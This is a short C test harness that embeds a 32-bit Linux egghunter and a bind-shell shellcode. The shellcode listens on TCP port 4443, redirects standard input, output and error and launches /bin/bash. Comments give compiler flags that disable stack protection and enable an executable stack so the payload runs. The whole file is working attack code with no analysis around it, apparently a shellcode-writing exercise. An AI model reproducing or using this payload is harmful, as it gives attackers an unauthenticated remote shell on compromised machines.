#include<stdio.h>
#include<string.h>
//gcc shellcode.c -fno-stack-protector -z execstack -o shellcode
//strace -e socket,bind,execve,accept,dup2,connect,accept,listen ./shellcode


unsigned char egghunter[] =
"\x31\xc9\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\x50\x90\x50\x90\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";



unsigned char shellcode[] = 
"\x50\x90\x50\x90\x50\x90\x50\x90\x31\xdb\x43\x31\xc0\x50\x40\x50\x40\x50\xb0\x66\x89\xe1\xcd\x80\x89\xc2\x31\xc0\x50\x66\x68\x11\x5b\x31\xdb\x43\x43\x66\x53\x89\xe1\x89\xc2\x6a\x10\x51\x6a\x03\x89\xc2\x89\xe1\xb0\x66\xcd\x80\x89\xc2\x31\xc0\x50\x43\x53\x43\x89\xe1\xb0\x66\xcd\x80\x89\xc2\x31\xc0\x50\x50\x40\x40\x40\x50\x89\xe1\x43\xb0\x66\xcd\x80\x89\xc2\x89\xd3\x31\xc0\x31\xc9\xb0\x3f\xcd\x80\xb0\x3f\x41\xcd\x80\xb0\x3f\x41\xcd\x80\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80";


main()
{

	printf("Shellcode Length:  %d\n", strlen(egghunter));

	int (*ret)() = (int(*)())egghunter;

	ret();

}
